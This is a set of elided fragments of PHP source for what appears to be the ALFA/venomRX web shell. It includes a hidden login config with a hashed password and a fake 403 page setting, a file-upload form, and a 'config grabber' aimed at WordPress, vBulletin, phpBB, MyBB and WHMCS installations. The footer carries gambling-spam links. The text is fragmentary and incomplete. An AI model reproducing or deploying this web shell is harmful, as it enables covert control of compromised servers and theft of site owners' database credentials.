...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'cf232ba42a11e0564fdf46de58a5e30b',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ venomRX&copy; 2012-".date('Y')." ]</span><br><span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://websiteseochecker.com/bulk-check-page-authority/'>Cek_Da_Pa</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>gondrong@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://www.google.com/search?q=slot+gacor&rlz=1C1UEAD_enID1131ID1131&oq=slot+gacor&gs_lcrp=EgZjaHJvbWUqDwgBEEUYOxiDARixAxiABDIPCAAQRRg7GIMBGLEDGIAEMg8IARBFGDsYgwEYsQMYgAQyBggCEEUYQDIKCAMQABixAxiABDIGCAQQABgDMgYIBRAAGAMyBggGEEUYPTIGCAcQRRg90gEIMjk5MGowajeoAgCwAgA&sourceid=chrome&ie=UTF-8'>Cek KW</a></span></div></td>
</tr>
</table>
</div>
...
<center><h3>';
$vals = array('WordPress' => array('wp',2),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7));
...
$cm_array = array("vb"=>"vBulletin","wp"=>"wordpress","whmcs"=>"whmcs","mybb"=>"mybb","phpbb"=>"phpbb");
...
function alfaconfig_grabber(){
	...
	<div class="txtfont">
	Dir: <inputsize="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
...
$nulls = array();foreach($vals as $key => $val){
